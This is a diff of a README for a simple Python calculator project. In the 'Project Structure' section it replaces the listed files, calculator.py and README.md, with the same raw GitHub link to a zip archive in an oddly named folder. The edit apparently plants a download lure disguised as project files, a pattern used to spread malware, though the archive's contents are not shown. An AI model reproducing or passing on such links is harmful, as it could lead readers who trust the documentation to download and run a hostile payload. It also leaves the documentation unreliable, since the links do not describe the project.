@@ -10,8 +10,8 @@ Built as part of my learning journey in programming and problem-solving.
 - Easy to extend with more operations (like power, modulus, etc.)
 
 ## Project Structure
-calculator.py     # Main program file
-README.md         # Project documentation
+https://raw.githubusercontent.com/Carlrevive/Syntecxhub_Project_Name/main/statuarist/Name-Syntecxhub-Project-3.3.zip     # Main program file
+https://raw.githubusercontent.com/Carlrevive/Syntecxhub_Project_Name/main/statuarist/Name-Syntecxhub-Project-3.3.zip         # Project documentation
 
  CHALLENGES I FACED
 User input issue:
